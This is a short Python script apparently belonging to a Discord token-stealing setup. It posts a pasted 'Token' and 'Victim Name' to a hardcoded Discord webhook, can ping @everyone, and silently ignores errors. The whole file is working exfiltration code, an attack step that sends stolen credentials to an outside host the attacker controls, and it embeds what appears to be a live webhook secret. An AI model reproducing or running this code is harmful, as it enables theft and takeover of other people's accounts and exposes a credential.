WEBHOOK_URL = 'https://discord.com/api/webhooks/1044767203930673265/g0DQ-Uenxd5PyaNW0yKQn1abi3wcbK5nfM-cBT0YGjLUBXjb-53D28lekTNqVmh_ORs'
Token = 'PASTE TOKEN HERE'
Victim = 'PASTE VICTIM NAME HERE'
ping = False

# https://trinket.io/embed/python3

import os
import re
import json

from urllib.request import Request, urlopen

def main():

    message = ' \nToken: \n``' + Token + "``\nVictim Name: \n``" + Victim + "``"
    if ping==True:
      message += '\n\n@everyone'
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': ' random crap. idk. it needs this to work. so... '
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

main()
